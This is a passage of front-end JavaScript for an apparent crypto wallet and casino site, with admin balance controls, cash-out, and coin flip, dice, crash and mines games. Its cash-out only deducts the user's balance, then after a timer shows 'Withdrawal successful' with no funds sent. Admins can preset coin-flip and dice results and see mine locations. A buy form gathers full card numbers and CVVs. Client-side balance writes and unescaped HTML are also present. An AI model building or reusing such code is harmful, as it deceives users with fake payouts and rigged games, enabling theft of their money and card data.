          <input class="admin-modify-input" type="number" placeholder="Amount ($)" id="amt-${user.id}" />
          <button class="admin-modify-btn admin-mod-add" onclick="adminModBal('${user.id}', 'add')">+ Add</button>
          <button class="admin-modify-btn admin-mod-set" onclick="adminModBal('${user.id}', 'set')">= Set</button>
          <button class="admin-modify-btn admin-mod-zero" onclick="adminModBal('${user.id}', 'zero')">✕ Zero</button>
        </div>`;
      list.appendChild(card);
    });
  }

  async function adminModBal(userId, action) {
    if (!isAdmin()) return;
    const input = document.getElementById('amt-' + userId);
    const amount = parseFloat(input?.value) || 0;

    const res = await supa('users?id=eq.' + userId + '&select=*');
    if (!res.ok || !res.data?.[0]) { showToast('User not found', true); return; }
    const user = res.data[0];
    let h = { ...(user.holdings || { BTC:0, ETH:0, USDT:0, SOL:0 }) };
    const curBal = computeBal(h);

    if (action === 'zero') {
      h = { BTC:0, ETH:0, USDT:0, SOL:0 };
    } else if (action === 'set') {
      if (amount < 0) { showToast('Enter a valid amount', true); return; }
      // Set by adjusting USDT
      h = { BTC:0, ETH:0, USDT: amount, SOL:0 };
    } else if (action === 'add') {
      if (amount === 0) { showToast('Enter an amount', true); return; }
      // Add/subtract from USDT
      h.USDT = Math.max(0, (h.USDT||0) + amount);
    }

    const newBal = computeBal(h);
    await supa('users?id=eq.' + userId, 'PATCH', { holdings: h, balance: newBal });
    showToast(action === 'zero' ? 'Balance zeroed' : action === 'set' ? 'Balance set to ' + fmt(amount) : 'Balance updated');
    if (input) input.value = '';
    loadAdminUsers();
  }

  function logout() {
    currentUser = null; clearSession(); activeWallet = null;
    document.getElementById('auth-screen').style.display = 'flex';
    document.getElementById('dash').style.display = 'none';
    document.getElementById('casino').style.display = 'none';
    document.getElementById('game-page').style.display = 'none';
    document.getElementById('admin-panel').style.display = 'none';
    document.getElementById('coin-wallet-panel').className = 'coin-wallet-panel';
    const adminBadge = document.getElementById('admin-topbadge');
    const adminBtn = document.getElementById('admin-panel-btn');
    if (adminBadge) adminBadge.style.display = 'none';
    if (adminBtn) adminBtn.style.display = 'none';
    document.getElementById('auth-username').value = '';
    document.getElementById('auth-password').value = '';
  }

  // ── DATA ─────────────────────────────────────────────────────────
  async function loadUserData() {
    if (isAdmin()) { updateDisplay(); return; }
    const res = await supa('users?id=eq.' + currentUser.id + '&select=*');
    if (res.ok && res.data[0]) {
      currentUser = res.data[0];
      // Always sync balance field to holdings computation
      const computed = computeBal(currentUser.holdings);
      if (Math.abs(computed - parseFloat(currentUser.balance || 0)) > 0.01) {
        await supa('users?id=eq.' + currentUser.id, 'PATCH', { balance: computed });
        currentUser.balance = computed;
      }
      saveSession(currentUser);
      updateDisplay();
    }
  }

  async function loadTransactions() {
    const res = await supa('transactions?or=(from_user.eq.'+currentUser.id+',to_user.eq.'+currentUser.id+')&order=created_at.desc&limit=20&select=*');
    const list = document.getElementById('tx-list');
    list.innerHTML = '';
    if (!res.ok || !res.data || res.data.length === 0) { list.innerHTML = '<div class="empty-tx">No transactions yet</div>'; return; }
    res.data.forEach(tx => {
      const isSent = tx.from_user === currentUser.id;
      const type = tx.type==='buy' ? 'recv' : tx.type==='convert' ? 'swap' : (isSent ? 'sent' : 'recv');
      const label = tx.type==='buy' ? 'Bought '+tx.coin : tx.type==='convert' ? 'Converted '+tx.coin : tx.type==='casino' ? '🎰 Casino '+tx.coin : isSent ? 'Sent '+tx.coin : 'Received '+tx.coin;
      const sign = (!isSent||tx.type==='buy'||tx.type==='casino') ? (tx.amount>=0?'+':'') : '-';
      const cls = (tx.amount>=0&&(!isSent||tx.type==='buy'||tx.type==='casino')) ? 'pos' : 'neg';
      const iconChar = type==='recv' ? '↓' : type==='swap' ? '⇄' : '↑';
      const date = new Date(tx.created_at).toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'});
      const item = document.createElement('div');
      item.className = 'tx-item';
      item.innerHTML = `<div class="tx-left"><div class="tx-icon ${type}">${iconChar}</div><div><div class="tx-name">${label}</div><div class="tx-date">${date}</div></div></div><div class="tx-amount ${cls}">${sign}${fmt(Math.abs(tx.amount))}</div>`;
      list.appendChild(item);
    });
  }

  function fmt(n) { return '$' + Math.abs(n).toLocaleString('en-US', { minimumFractionDigits:2, maximumFractionDigits:2 }); }

  function updateDisplay() {
    const h = currentUser.holdings || { BTC:0, ETH:0, USDT:0, SOL:0 };
    // ▶ THE FIX: total balance is always computed from holdings
    const bal = computeBal(h);
    currentUser.balance = bal;

    document.getElementById('bal-display').textContent = fmt(bal);
    document.getElementById('bal-hint').style.display = bal > 0 ? 'none' : 'block';
    document.getElementById('btn-send').disabled = bal <= 0;
    document.getElementById('btn-convert').disabled = bal <= 0;
    // Cash Out only enabled if balance >= $25
    document.getElementById('cashout-pill-btn').disabled = bal < 25;

    document.getElementById('btc-amount').textContent  = (h.BTC||0).toFixed(6) + ' BTC';
    document.getElementById('btc-usd').textContent     = '≈ ' + fmt((h.BTC||0)*prices.BTC);
    document.getElementById('eth-amount').textContent  = (h.ETH||0).toFixed(4) + ' ETH';
    document.getElementById('eth-usd').textContent     = '≈ ' + fmt((h.ETH||0)*prices.ETH);
    document.getElementById('usdt-amount').textContent = (h.USDT||0).toFixed(2) + ' USDT';
    document.getElementById('usdt-usd').textContent    = '≈ ' + fmt(h.USDT||0);
    document.getElementById('sol-amount').textContent  = (h.SOL||0).toFixed(3) + ' SOL';
    document.getElementById('sol-usd').textContent     = '≈ ' + fmt((h.SOL||0)*prices.SOL);

    if (activeWallet) renderWalletPanel(activeWallet);
  }

  function updateCasinoBal() {
    const b = fmt(computeBal(currentUser.holdings));
    document.getElementById('casino-bal-display').textContent = b;
  }
  function updateGameBal() {
    const b = fmt(computeBal(currentUser.holdings));
    const el = document.getElementById('game-bal-display');
    if (el) el.textContent = b;
  }

  // ── COIN WALLET PANEL ────────────────────────────────────────────
  function toggleWallet(coin) {
    if (activeWallet === coin) { closeWallet(); return; }
    activeWallet = coin;
    ['BTC','ETH','USDT','SOL'].forEach(c => {
      document.getElementById('card-'+c).classList.toggle('active', c===coin);
    });
    renderWalletPanel(coin);
    document.getElementById('coin-wallet-panel').className = 'coin-wallet-panel open';
  }

  function renderWalletPanel(coin) {
    const h = currentUser.holdings || {};
    const amt = h[coin] || 0;
    document.getElementById('cwp-symbol').textContent = coinSyms[coin];
    document.getElementById('cwp-name').textContent   = coinFull[coin] + ' Wallet';
    document.getElementById('cwp-amt').textContent    = amt.toFixed(coinDec[coin]) + ' ' + coin;
    document.getElementById('cwp-usd').textContent    = '≈ ' + fmt(amt * prices[coin]);
  }

  function closeWallet() {
    activeWallet = null;
    document.getElementById('coin-wallet-panel').className = 'coin-wallet-panel';
    ['BTC','ETH','USDT','SOL'].forEach(c => document.getElementById('card-'+c).classList.remove('active'));
  }

  // ── CASH OUT MODAL ───────────────────────────────────────────────
  function openCashoutModal() {
    const bal = computeBal(currentUser.holdings);
    if (bal < 25) { showToast('Minimum withdrawal is $25', true); return; }
    const bg = document.getElementById('modal-bg');
    const box = document.getElementById('modal-box');
    bg.classList.add('open');
    box.className = 'modal';
    document.getElementById('modal-title').textContent = '💸 Cash Out';
    document.getElementById('modal-body').innerHTML = `
      <input type="number" id="co-amt" placeholder="Amount ($)" min="25" max="${bal.toFixed(2)}" value="${bal.toFixed(2)}" />
      <div class="co-hint">Minimum $25.00 &nbsp;·&nbsp; Available: ${fmt(bal)}</div>
      <div class="co-divider"></div>
      <select id="co-coin">
        <option value="BTC">Bitcoin (BTC)</option>
        <option value="ETH">Ethereum (ETH)</option>
        <option value="USDT">Tether (USDT)</option>
        <option value="SOL">Solana (SOL)</option>
        <option value="LTC">Litecoin (LTC)</option>
      </select>
      <input type="text" id="co-wallet" placeholder="Your wallet address" />
      <div class="modal-actions">
        <button class="btn-cancel" onclick="closeModal()">Cancel</button>
        <button class="btn-primary" onclick="doCashout()">Withdraw</button>
      </div>`;
  }

  async function doCashout() {
    const amount = parseFloat(document.getElementById('co-amt').value) || 0;
    const coin   = document.getElementById('co-coin').value;
    const wallet = document.getElementById('co-wallet').value.trim();
    const bal    = computeBal(currentUser.holdings);

    if (amount < 25)   { showToast('Minimum withdrawal is $25', true); return; }
    if (amount > bal)  { showToast('Amount exceeds your balance', true); return; }
    if (!wallet)       { showToast('Enter your wallet address', true); return; }

    closeModal();

    // Show pending overlay
    const overlay  = document.getElementById('withdrawal-overlay');
    const spinner  = document.getElementById('wd-spinner');
    const check    = document.getElementById('wd-check');
    const title    = document.getElementById('wd-title');
    const sub      = document.getElementById('wd-sub');
    spinner.style.display = 'block';
    check.style.display   = 'none';
    title.textContent = 'Pending cash out';
    sub.textContent   = 'Processing your withdrawal…';
    overlay.classList.add('open');

    // Deduct proportionally from all holdings
    const h = { ...(currentUser.holdings || { BTC:0, ETH:0, USDT:0, SOL:0 }) };
    const ratio = amount / bal;
    Object.keys(h).forEach(c => { h[c] = Math.max(0, (h[c]||0) * (1 - ratio)); });
    const newBal = computeBal(h);
    await supa('users?id=eq.'+currentUser.id, 'PATCH', { holdings: h, balance: newBal });
    await supa('transactions', 'POST', { from_user: currentUser.id, to_user: null, coin, amount: -amount, type: 'send' });
    currentUser.holdings = h;
    currentUser.balance  = newBal;
    saveSession(currentUser);

    // After 3s → success tick
    setTimeout(() => {
      spinner.style.display = 'none';
      check.style.display   = 'flex';
      title.textContent = 'Withdrawal successful';
      sub.textContent   = fmt(amount) + ' sent to your ' + coin + ' wallet';
      setTimeout(() => {
        overlay.classList.remove('open');
        updateDisplay();
        loadTransactions();
      }, 2500);
    }, 3000);
  }

  // ── TOAST ────────────────────────────────────────────────────────
  function showToast(msg, isErr) {
    const t = document.getElementById('toast');
    t.textContent = msg; t.className = 'toast' + (isErr ? ' error' : '');
    t.style.display = 'block';
    setTimeout(() => t.style.display = 'none', 2500);
  }
  function copyWallet() { navigator.clipboard.writeText(currentUser.wallet_address); showToast('Wallet address copied!'); }

  // ── CASINO updateBalance — uses USDT holdings as casino wallet ───
  async function updateBalance(delta, gameLabel) {
    const h = { ...(currentUser.holdings || { BTC:0, ETH:0, USDT:0, SOL:0 }) };
    const bal = computeBal(h);
    if (delta < 0) {
      // Deduct proportionally from all coins
      const ratio = Math.min(1, Math.abs(delta) / (bal || 1));
      Object.keys(h).forEach(c => { h[c] = Math.max(0, (h[c]||0) * (1 - ratio)); });
    } else {
      // Winnings go into USDT
      h.USDT = (h.USDT||0) + delta;
    }
    const newBal = computeBal(h);
    await supa('users?id=eq.'+currentUser.id, 'PATCH', { holdings: h, balance: newBal });
    await supa('transactions', 'POST', { from_user: currentUser.id, to_user: currentUser.id, coin: gameLabel, amount: delta, type: 'casino' });
    currentUser.holdings = h;
    currentUser.balance  = newBal;
    saveSession(currentUser);
    updateCasinoBal();
    updateGameBal();
  }

  function getBet(inputId) {
    const val = parseFloat(document.getElementById(inputId).value) || 0;
    const bal = computeBal(currentUser.holdings);
    if (val <= 0) { showToast('Enter a valid bet', true); return null; }
    if (val > bal + 0.001) { showToast('Insufficient balance', true); return null; }
    return Math.min(val, bal);
  }
  function halfBet(id) {
    const bal = computeBal(currentUser.holdings);
    const cur = parseFloat(document.getElementById(id).value) || bal;
    document.getElementById(id).value = (cur/2).toFixed(2);
  }
  function maxBet(id) { document.getElementById(id).value = computeBal(currentUser.holdings).toFixed(2); }

  // ── ADMIN pre-generated results ───────────────────────────────────
  let cfSequence = [];      // array of 'heads'/'tails' up to 5, consumed in order
  let cfSequenceIndex = 0;
  let diceAdminResult = null;

  // ── COIN FLIP ────────────────────────────────────────────────────
  let cfSide = null;
  let cfMultiRound = 0;      // current round 0-4 (0=not started)
  let cfMultiWinnings = 0;   // accumulated winnings so far
  let cfMultiBet = 0;        // original bet
  let cfMultiActive = false;

  function cfSeqAdd(side) {
    if (cfSequence.length >= 5) { showToast('Max 5 in sequence', true); return; }
    cfSequence.push(side);
    renderCfSeq();
  }
  function cfSeqClear() { cfSequence = []; cfSequenceIndex = 0; renderCfSeq(); }
  function renderCfSeq() {
    const pills = document.getElementById('cf-seq-pills');
    if (!pills) return;
    pills.innerHTML = cfSequence.map((s,i) =>
      `<span class="cf-seq-pill ${s}" style="${i < cfSequenceIndex ? 'opacity:0.35;text-decoration:line-through;' : ''}">${s==='heads'?'👑H':'🌀T'}</span>`
    ).join('');
  }
  function selectSide(side) {
    cfSide = side;
    const h = document.getElementById('cf-heads');
    const t = document.getElementById('cf-tails');
    if (h) h.className = 'side-btn' + (side==='heads' ? ' selected' : '');
    if (t) t.className = 'side-btn' + (side==='tails' ? ' selected' : '');
  }

  function cfSetRoundActive(round) {
    for (let i = 1; i <= 5; i++) {
      const row = document.getElementById('cf-round-'+i);
      if (!row) continue;
      if (i < round) continue; // already handled
      if (i === round) row.className = 'cf-multi-row cf-multi-active';
      else row.className = 'cf-multi-row cf-multi-inactive';
    }
  }

  async function playCoinFlip() {
    if (!cfSide) { showToast('Pick heads or tails', true); return; }

    // First flip — deduct bet
    if (!cfMultiActive) {
      const bet = getBet('cf-bet'); if (!bet) return;
      cfMultiBet = bet;
      cfMultiWinnings = bet;
      cfMultiActive = true;
      cfMultiRound = 1;
      await updateBalance(-bet, 'Coin Flip (bet)');
      // Lock bet row
      const br = document.getElementById('cf-bet-row');
      if (br) br.style.display = 'none';
      // Enable cashout
      const co = document.getElementById('cf-cashout-btn');
      if (co) { co.disabled = false; co.style.opacity = '1'; }
    }

    const currentRound = cfMultiRound;
    const multiplier = Math.pow(2, currentRound); // 2,4,8,16,32
    cfSetRoundActive(currentRound);

    const r = document.getElementById('cf-result');
    r.className = 'game-result';
    r.textContent = '🪙 Flipping round ' + currentRound + '...';

    await new Promise(x => setTimeout(x, 700));

    // Get result — admin sequence or random
    let result;
    if (isAdmin() && cfSequence.length > 0 && cfSequenceIndex < cfSequence.length) {
      result = cfSequence[cfSequenceIndex];
      cfSequenceIndex++;
      renderCfSeq();
    } else {
      result = Math.random() < 0.5 ? 'heads' : 'tails';
    }

    const won = result === cfSide;
    const roundRow = document.getElementById('cf-round-' + currentRound);
    const roundResult = document.getElementById('cf-rr-' + currentRound);

    if (!won) {
      // Lost — game over
      if (roundRow) roundRow.className = 'cf-multi-row cf-multi-lost';
      if (roundResult) roundResult.textContent = (result==='heads'?'👑':'🌀') + ' Lost';
      r.className = 'game-result lose';
      r.textContent = (result==='heads'?'👑':'🌀') + ' ' + result + ' — Lost ' + fmt(cfMultiBet) + '!';
      cfMultiActive = false; cfMultiRound = 0;
      const co = document.getElementById('cf-cashout-btn');
      if (co) { co.disabled = true; co.style.opacity = '0.35'; }
      const br = document.getElementById('cf-bet-row');
      if (br) br.style.display = 'flex';
    } else {
      // Won this round
      if (roundRow) roundRow.className = 'cf-multi-row cf-multi-won';
      if (roundResult) roundResult.textContent = (result==='heads'?'👑':'🌀') + ' ' + multiplier + '×';
      cfMultiWinnings = cfMultiBet * multiplier;

      if (currentRound >= 5) {
        // Max rounds reached — auto cashout
        await updateBalance(cfMultiWinnings, 'Coin Flip (win)');
        r.className = 'game-result win';
        r.textContent = '🏆 Cleared all 5 rounds! Won ' + fmt(cfMultiWinnings - cfMultiBet) + '!';
        cfMultiActive = false; cfMultiRound = 0;
        const co = document.getElementById('cf-cashout-btn');
        if (co) { co.disabled = true; co.style.opacity = '0.35'; }
        const br = document.getElementById('cf-bet-row');
        if (br) br.style.display = 'flex';
      } else {
        cfMultiRound++;
        cfSetRoundActive(cfMultiRound);
        r.className = 'game-result win';
        r.textContent = '✅ Round ' + currentRound + ' won! Cash out ' + fmt(cfMultiWinnings) + ' or go for ' + Math.pow(2,cfMultiRound) + '×';
      }
    }
  }

  async function cfCashout() {
    if (!cfMultiActive || cfMultiWinnings <= 0) return;
    await updateBalance(cfMultiWinnings, 'Coin Flip (cashout)');
    const r = document.getElementById('cf-result');
    r.className = 'game-result win';
    r.textContent = '💰 Cashed out at ' + Math.pow(2, cfMultiRound-1) + '× — Won ' + fmt(cfMultiWinnings - cfMultiBet) + '!';
    cfMultiActive = false; cfMultiRound = 0;
    const co = document.getElementById('cf-cashout-btn');
    if (co) { co.disabled = true; co.style.opacity = '0.35'; }
    const br = document.getElementById('cf-bet-row');
    if (br) br.style.display = 'flex';
  }

  // ── DICE ─────────────────────────────────────────────────────────
  let diceChoice = null;
  const diceFaces = ['⚀','⚁','⚂','⚃','⚄','⚅'];
  function selectDice(n) {
    diceChoice = n;
    document.querySelectorAll('.dice-opt').forEach((el,i) => el.className='dice-opt'+(i+1===n?' selected':''));
  }
  async function playDice() {
    const bet = getBet('dice-bet'); if (!bet) return;
    if (!diceChoice) { showToast('Pick a number', true); return; }
    const r = document.getElementById('dice-result');
    r.className = 'game-result'; r.textContent = '🎲 Rolling...';
    await new Promise(x => setTimeout(x, 800));
    const roll = (isAdmin() && diceAdminResult) ? diceAdminResult : Math.floor(Math.random()*6)+1;
    diceAdminResult = null;
    const won = roll === diceChoice;
    await updateBalance(won ? bet*4 : -bet, 'Dice Roll');
    r.className = 'game-result ' + (won ? 'win' : 'lose');
    r.textContent = diceFaces[roll-1] + ' Rolled '+roll+' — ' + (won ? 'You won '+fmt(bet*4)+'!' : 'You lost '+fmt(bet));
  }

  // ── CRASH ────────────────────────────────────────────────────────
  let crashInterval=null, crashMultiplier=1.0, crashPoint=1.0, crashBet=0, crashRunning=false, cashedOut=false, crashShowBar=false;
  function generateCrashPoint() {
    const r = Math.random();
    if (r < 0.4) return 1.0 + Math.random()*0.5;
    if (r < 0.7) return 1.5 + Math.random()*1.0;
    if (r < 0.9) return 2.5 + Math.random()*2.5;
    return 5.0 + Math.random()*10.0;
  }
  function resetCrash() {
    clearInterval(crashInterval);
    crashRunning=false; cashedOut=false; crashMultiplier=1.0; crashBet=0; crashShowBar=false; crashPoint=0;
    const cd=document.getElementById('crash-display'); if(cd){cd.textContent='1.00x';cd.className='crash-display';}
    const cb=document.getElementById('crash-bar'); if(cb){cb.style.width='0%';cb.className='crash-bar';}
    const cbw=document.getElementById('crash-bar-wrap'); if(cbw) cbw.style.display='none';
    const cr=document.getElementById('crash-result'); if(cr){cr.className='game-result';cr.textContent='Place your bet and start';}
    const csb=document.getElementById('crash-start-btn'); if(csb) csb.disabled=false;
    const ccb=document.getElementById('crash-cashout-btn'); if(ccb) ccb.disabled=true;
  }
  async function startCrash() {
    const bet = getBet('crash-bet'); if (!bet) return;
    crashBet=bet;
    // Use admin pre-set point if available, otherwise generate fresh
    if (!crashPoint || crashPoint === 0) crashPoint = generateCrashPoint();
    crashMultiplier=1.0; crashRunning=true; cashedOut=false;
    crashShowBar = Math.random() < (1/20);
    document.getElementById('crash-bar-wrap').style.display = crashShowBar ? 'block' : 'none';
    document.getElementById('crash-start-btn').disabled=true;
    document.getElementById('crash-cashout-btn').disabled=false;
    document.getElementById('crash-result').className='game-result';
    document.getElementById('crash-result').textContent='📈 Running... cash out before it crashes!';
    await updateBalance(-bet, 'Crash (bet)');
    const usedCrashPoint = crashPoint; // snapshot so it doesn't change mid-game
    crashInterval = setInterval(async () => {
      crashMultiplier += 0.03 + crashMultiplier*0.01;
      document.getElementById('crash-display').textContent = crashMultiplier.toFixed(2)+'x';
      if (crashShowBar) {
        const pct = Math.min(100,((crashMultiplier-1)/(usedCrashPoint-1))*100);
        document.getElementById('crash-bar').style.width=pct+'%';
        if (pct>60) document.getElementById('crash-bar').className='crash-bar danger';
      }
      if (crashMultiplier>=usedCrashPoint && !cashedOut) {
        clearInterval(crashInterval); crashRunning=false;
        document.getElementById('crash-display').className='crash-display crashed';
        document.getElementById('crash-display').textContent='💥 '+usedCrashPoint.toFixed(2)+'x';
        document.getElementById('crash-result').className='game-result lose';
        document.getElementById('crash-result').textContent='Crashed at '+usedCrashPoint.toFixed(2)+'x — You lost '+fmt(crashBet);
        document.getElementById('crash-cashout-btn').disabled=true;
        setTimeout(resetCrash,3000);
      }
    }, 100);
  }
  async function cashOut() {
    if (!crashRunning||cashedOut) return;
    cashedOut=true; clearInterval(crashInterval); crashRunning=false;
    const winnings = crashBet*crashMultiplier;
    await updateBalance(winnings, 'Crash (cashout)');
    document.getElementById('crash-display').className='crash-display safe';
    document.getElementById('crash-result').className='game-result win';
    document.getElementById('crash-result').textContent='Cashed out at '+crashMultiplier.toFixed(2)+'x — You won '+fmt(winnings-crashBet)+'!';
    document.getElementById('crash-cashout-btn').disabled=true;
    setTimeout(resetCrash,3000);
  }

  // ── MINES ────────────────────────────────────────────────────────
  const MINES_TOTAL=25;
  let minesBoard=[], minesRevealed=[], minesActive=false, minesGemsFound=0, minesBet=0, minesCount=3, minesMultiplier=1.0;

  function calcMinesMultiplier(gems, mines) {
    if (gems===0) return 1.0;
    let m=1.0;
    for (let i=0;i<gems;i++) m *= (MINES_TOTAL-mines-i)/(MINES_TOTAL-i);
    return Math.max(1.0, (1/m)*0.97);
  }
  function calcNextMult(gems,mines) { return calcMinesMultiplier(gems+1,mines); }
  function updateMinesMultiplier() {
    minesCount = parseInt(document.getElementById('mines-count').value)||3;
    document.getElementById('mines-next-mult').textContent = calcNextMult(minesGemsFound,minesCount).toFixed(2)+'x';
  }
  function buildMinesGrid() {
    const grid = document.getElementById('mines-grid'); grid.innerHTML='';
    for (let i=0;i<MINES_TOTAL;i++) {
      const cell = document.createElement('div');
      cell.className='mine-cell disabled'; cell.dataset.index=i;
      cell.innerHTML='<span class="cell-inner">💎</span>'; cell.style.opacity='0.3';
      cell.onclick=()=>revealCell(i); grid.appendChild(cell);
    }
  }
  function resetMines() {
    minesBoard=[]; minesRevealed=Array(MINES_TOTAL).fill(false);
    minesActive=false; minesGemsFound=0; minesBet=0; minesMultiplier=1.0;
    document.getElementById('mines-current-mult').textContent='1.00x';
    document.getElementById('mines-current-mult').style.color='';
    document.getElementById('mines-profit-display').textContent='$0.00';
    document.getElementById('mines-cashout-btn').disabled=true;
    document.getElementById('mines-start-btn').disabled=false;
    document.getElementById('mines-start-btn').textContent='Start Game';
    document.getElementById('mines-bet').disabled=false;
    document.getElementById('mines-count').disabled=false;
    buildMinesGrid(); updateMinesMultiplier();
  }
  function placeMines(mineCount, firstClick) {
    const available = Array.from({length:MINES_TOTAL},(_,i)=>i).filter(i=>i!==firstClick);
    const positions=[];
    while (positions.length<mineCount&&available.length>0) {
      const idx=Math.floor(Math.random()*available.length);
      positions.push(available.splice(idx,1)[0]);
    }
    const board=Array(MINES_TOTAL).fill(false);
    positions.forEach(p=>board[p]=true);
    return board;
  }
  async function startMines() {
    const bet=getBet('mines-bet'); if (!bet) return;
    minesCount=parseInt(document.getElementById('mines-count').value)||3;
    if (minesCount>=MINES_TOTAL) { showToast('Too many mines!',true); return; }
    minesBet=bet; minesGemsFound=0; minesRevealed=Array(MINES_TOTAL).fill(false);
    minesMultiplier=1.0; minesActive=true;
    await updateBalance(-bet,'Mines (bet)');
    document.getElementById('mines-start-btn').disabled=true;
    document.getElementById('mines-bet').disabled=true;
    document.getElementById('mines-count').disabled=true;
    document.getElementById('mines-cashout-btn').disabled=false;
    document.getElementById('mines-current-mult').textContent='1.00x';
    document.getElementById('mines-profit-display').textContent='-'+fmt(bet);
    document.getElementById('mines-next-mult').textContent=calcNextMult(0,minesCount).toFixed(2)+'x';
    document.querySelectorAll('.mine-cell').forEach(c=>{c.className='mine-cell';c.style.opacity='1';});
    // Pre-generate board now so admin can see mine positions immediately
    minesBoard = placeMines(minesCount, -1); // -1 = no protected first click yet
    if (isAdmin()) {
      const minePositions = minesBoard.map((v,i)=>v?i:-1).filter(i=>i>=0);
      const hint = document.getElementById('admin-hint');
      if (hint) hint.textContent = '💣 Mines at cells: ' + minePositions.map(i=>i+1).join(', ');
      // Highlight mine cells subtly for admin
      minePositions.forEach(i => {
        const c = document.querySelector(`.mine-cell[data-index="${i}"]`);
        if (c) c.style.boxShadow = 'inset 0 0 0 2px rgba(240,100,100,0.6)';
      });
    }
  }
  async function revealCell(index) {
    if (!minesActive||minesRevealed[index]) return;
    if (minesBoard===null) minesBoard=placeMines(minesCount,index);
    minesRevealed[index]=true;
    const cell=document.querySelector(`.mine-cell[data-index="${index}"]`);
    // Clear admin highlight on revealed cell
    if (cell) cell.style.boxShadow='';
    if (minesBoard[index]) {
      minesActive=false;
      cell.className='mine-cell revealed-mine disabled';
      cell.innerHTML='<span class="cell-inner">💣</span>';
      minesBoard.forEach((isMine,i)=>{
        if (isMine&&i!==index) {
          const c=document.querySelector(`.mine-cell[data-index="${i}"]`);
          c.className='mine-cell show-mine disabled';
          c.innerHTML='<span class="cell-inner">💣</span>'; c.style.opacity='0.6';
        }
      });
      document.querySelectorAll('.mine-cell').forEach(c=>c.classList.add('disabled'));
      document.getElementById('mines-cashout-btn').disabled=true;
      document.getElementById('mines-current-mult').textContent='💥 BUST';
      document.getElementById('mines-current-mult').style.color='var(--color-text-danger)';
      document.getElementById('mines-profit-display').textContent='-'+fmt(minesBet);
      showToast('💣 You hit a mine! Lost '+fmt(minesBet),true);
      setTimeout(()=>resetMines(),1200);
      document.getElementById('mines-start-btn').disabled=false;
      document.getElementById('mines-start-btn').textContent='Play Again';
      document.getElementById('mines-bet').disabled=false;
      document.getElementById('mines-count').disabled=false;
    } else {
      minesGemsFound++;
      cell.className='mine-cell revealed-gem disabled';
      cell.innerHTML='<span class="cell-inner">💎</span>';
      minesMultiplier=calcMinesMultiplier(minesGemsFound,minesCount);
      const profit=(minesBet*minesMultiplier)-minesBet;
      document.getElementById('mines-current-mult').textContent=minesMultiplier.toFixed(2)+'x';
      document.getElementById('mines-current-mult').style.color='var(--color-text-success)';
      document.getElementById('mines-profit-display').textContent='+'+fmt(profit);
      const safeLeft=MINES_TOTAL-minesCount-minesGemsFound;
      if (safeLeft===0) { await minesCashout(); }
      else { document.getElementById('mines-next-mult').textContent=calcNextMult(minesGemsFound,minesCount).toFixed(2)+'x'; }
    }
  }
  async function minesCashout() {
    if (!minesActive) return; minesActive=false;
    const winnings=minesBet*minesMultiplier;
    await updateBalance(winnings,'Mines (cashout)');
    document.querySelectorAll('.mine-cell').forEach(c=>c.classList.add('disabled'));
    document.getElementById('mines-cashout-btn').disabled=true;
    document.getElementById('mines-profit-display').textContent='+'+fmt(winnings-minesBet);
    showToast('💎 Cashed out at '+minesMultiplier.toFixed(2)+'x — Won '+fmt(winnings-minesBet)+'!');
    await new Promise(r=>setTimeout(r,1500));
    document.getElementById('mines-start-btn').disabled=false;
    document.getElementById('mines-start-btn').textContent='Play Again';
    document.getElementById('mines-bet').disabled=false;
    document.getElementById('mines-count').disabled=false;
  }

  // ── WALLET MODALS ────────────────────────────────────────────────
  function openModal(type) {
    const bg=document.getElementById('modal-bg'), title=document.getElementById('modal-title');
    const body=document.getElementById('modal-body'), box=document.getElementById('modal-box');
    bg.classList.add('open'); box.className='modal';
    if (type==='send') {
      title.textContent='Send crypto';
      body.innerHTML=`<input type="text" placeholder="Recipient wallet address (CVT-...)" id="m-addr" /><select id="m-coin"><option>BTC</option><option>ETH</option><option>USDT</option><option>SOL</option></select><input type="number" placeholder="Amount in USD" id="m-amt" min="0" /><div class="modal-actions"><button class="btn-cancel" onclick="closeModal()">Cancel</button><button class="btn-primary" onclick="doSend()">Send</button></div>`;
    } else if (type==='receive') {
      title.textContent='Receive crypto';
      body.innerHTML=`<div style="text-align:center;padding:8px 0 12px;"><div style="font-size:11px;color:var(--color-text-secondary);margin-bottom:8px;">Your wallet address</div><div style="font-size:13px;font-family:var(--font-mono);background:var(--color-background-secondary);padding:10px;border-radius:var(--border-radius-md);word-break:break-all;color:var(--color-text-primary);">${currentUser.wallet_address}</div></div><div class="modal-actions"><button class="btn-cancel" style="flex:1" onclick="closeModal()">Close</button></div>`;
    } else if (type==='convert') {
      title.textContent='Convert crypto';
      body.innerHTML=`<select id="c-from"><option>BTC</option><option>ETH</option><option>USDT</option><option>SOL</option></select><select id="c-to"><option>USDT</option><option>BTC</option><option>ETH</option><option>SOL</option></select><input type="number" placeholder="Amount in USD" id="c-amt" min="0" /><div class="modal-actions"><button class="btn-cancel" onclick="closeModal()">Cancel</button><button class="btn-primary" onclick="doConvert()">Convert</button></div>`;
    } else if (type==='buy') {
      box.className='modal buy-modal'; title.textContent='Buy crypto';
      body.innerHTML=`<div class="amount-row"><input type="number" placeholder="0.00" id="b-amt" min="0" oninput="updateCard()" /><select id="b-coin" onchange="updateCard()"><option>BTC</option><option>ETH</option><option>USDT</option><option>SOL</option></select></div><div class="card-wrap"><div class="credit-card"><div class="card-shine"></div><div class="card-top"><div class="card-chip"><div class="chip-line"></div><div class="chip-line"></div><div class="chip-center"></div><div class="chip-line"></div><div class="chip-line"></div></div><div class="card-network">VISA</div></div><div class="card-number" id="cc-number">•••• •••• •••• ••••</div><div class="card-bottom"><div><div class="card-field-label">Card holder</div><div class="card-field-value placeholder" id="cc-name">YOUR NAME</div></div><div><div class="card-field-label">Expires</div><div class="card-field-value placeholder" id="cc-expiry">MM/YY</div></div><div><div class="card-field-label">CVV</div><div class="card-field-value placeholder" id="cc-cvv">•••</div></div></div></div></div><div class="card-inputs"><input class="full" type="text" placeholder="Card number" id="inp-number" maxlength="19" oninput="fmtCardNum(this);updateCard()" /><input type="text" placeholder="MM/YY" id="inp-expiry" maxlength="5" oninput="fmtExpiry(this);updateCard()" /><input type="text" placeholder="CVV" id="inp-cvv" maxlength="3" oninput="updateCard()" /><input class="full" type="text" placeholder="Name on card" id="inp-name" oninput="updateCard()" /></div><div class="modal-actions" style="margin-top:8px;"><button class="btn-cancel" onclick="closeModal()">Cancel</button><button class="btn-primary" id="pay-btn" style="opacity:0.35;cursor:not-allowed;" disabled onclick="doBuy()">Pay now</button></div>`;
    }
  }

  function fmtCardNum(el) { let v=el.value.replace(/\D/g,'').slice(0,16); el.value=v.match(/.{1,4}/g)?.join(' ')||v; }
